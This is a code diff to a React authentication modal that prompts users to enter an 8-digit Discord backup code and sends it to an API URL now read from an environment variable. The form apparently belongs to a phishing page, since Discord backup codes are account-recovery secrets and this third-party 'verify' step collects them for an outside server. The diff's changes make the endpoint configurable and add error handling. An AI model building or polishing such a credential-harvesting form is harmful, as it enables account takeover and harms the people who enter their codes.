@@ -16,7 +16,7 @@ export default function AuthModal() {
     e.preventDefault()
 
     try {
-      const response = await fetch("/api/verify", {
+      const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL}/api/verify`, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -26,6 +26,9 @@ export default function AuthModal() {
 
       if (response.ok) {
         router.push("/success")
+      } else {
+        // Handle error, maybe show an error message to the user
+        console.error("Verification failed")
       }
     } catch (error) {
       console.error("Verification failed:", error)
@@ -44,7 +47,7 @@ export default function AuthModal() {
       <form onSubmit={handleSubmit}>
         <div className="space-y-4">
           <div>
-            <p className="text-sm text-gray-400 uppercase font-semibold tracking-wide mb-2">Enter Discord Backup Code</p>
+            <p className="text-sm text-gray-400 uppercase tracking-wide mb-2">Enter Discord Backup Code</p>
             <Input
               type="text"
               placeholder="8-digit backup code"
@@ -66,4 +69,5 @@ export default function AuthModal() {
     </div>
   )
 }
+
 
